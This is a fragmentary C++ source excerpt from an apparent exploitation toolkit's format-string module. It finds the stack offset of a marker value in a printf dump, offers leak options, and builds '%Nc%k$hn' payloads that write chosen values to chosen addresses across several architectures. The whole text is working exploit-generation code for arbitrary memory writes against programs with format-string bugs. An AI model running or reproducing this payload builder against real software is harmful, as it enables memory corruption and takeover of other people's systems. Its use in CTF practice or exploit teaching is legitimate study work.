...
std::optional<std::size_t> find_marker_offset(
    ...
    std::uint64_t    marker)
{
    ...
    for (std::size_t i = 0; i < dump.size(); ++i) {
        ...
        if (!is_hex_char) {
            if (auto r = handle_token(dump.substr(start, i - start))) return r;
            start = i + 1;
        }
    }
    if (auto r = handle_token(dump.substr(start))) return r;
    return std::nullopt;
}
...
core::Result<std::vector<std::uint8_t>> build_write_payload(const WriteSpec& spec) {
    ...
    for (const auto& [half, arg_idx] : ordered) {
        std::int64_t need = static_cast<std::int64_t>(half) - static_cast<std::int64_t>(produced & 0xffffU);
        if (need <= 0) {
            need += 0x10000;
        }
        char buf[64];
        std::snprintf(buf, sizeof buf, "%%%lldc%%%zu$hn",
            static_cast<long long>(need), arg_idx);
        fmt_str.append(buf);
...
void FmtCommand::setup(CLI::App& app) {
    app.add_option("--find-offset", find_offset_dump,
        "Locate 0x41414141 in a printf-style hex dump");
    app.add_option("--leak", leak_address_hex,
        "Format-arg index whose value should be leaked as a string");
    app.add_option("--write", write_spec,
        "Build a what-where payload: <addr>=<value> (hex literals)");
    app.add_option("--arg-position", arg_position,
        "Format-arg position (1-based) used by --write");
    app.add_option("--arch", arch_str,
        "x86 | x86_64 | arm | aarch64 (default x86_64)");
...
core::Result<core::CommandResult> FmtCommand::run(const core::Context& /*ctx*/) {
    ...
    if (arg_position > 0) {
        ...
        res.raw_lines.push_back("arg "
            + std::to_string(arg_position + static_cast<std::int64_t>(start_offset))
